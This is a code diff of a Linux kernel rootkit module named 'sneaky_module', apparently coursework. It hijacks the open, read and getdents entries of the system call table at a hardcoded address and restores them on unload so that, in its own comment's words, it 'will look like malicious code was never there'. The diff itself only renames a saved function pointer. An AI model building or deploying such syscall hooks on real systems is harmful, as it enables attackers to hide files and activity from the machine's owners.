@@ -58,11 +58,10 @@ static unsigned long *sys_call_table = (unsigned long*)0xffffffff81a00200;
 //This is used for all system calls.
 
 
-//asmlinkage int (*original_open)(const char *pathname, int flags); //for open syscal
-
-asmlinkage int (*original_call)(const char * pathname, int flags); //for open syscall
+asmlinkage int (*original_read)(int fd, void * buf, size_t count); //for read syscall
+asmlinkage int (*original_open)(const char *pathname, int flags); //for open syscall
 asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count); //for getdents syscall
-asmlinkage ssize_t (*original_read)(int fd, void * buf, size_t count); //for read syscall
+//asmlinkage int (*original_call)(const char * pathname, int flags); //for open syscall
 
 
 
@@ -146,7 +145,7 @@ static int initialize_sneaky_module(void)
 
   
   //for open
-  original_call = (void*)*(sys_call_table + __NR_open);
+  original_open = (void*)*(sys_call_table + __NR_open);
   *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
 
   //for read
@@ -182,7 +181,7 @@ static void exit_sneaky_module(void)
 
   //This is more magic! Restore the original 'open' system call
   //function address. Will look like malicious code was never there!
-  *(sys_call_table + __NR_open) = (unsigned long)original_call;
+  *(sys_call_table + __NR_open) = (unsigned long)original_open;
   *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
   *(sys_call_table + __NR_read) = (unsigned long)original_read;
 
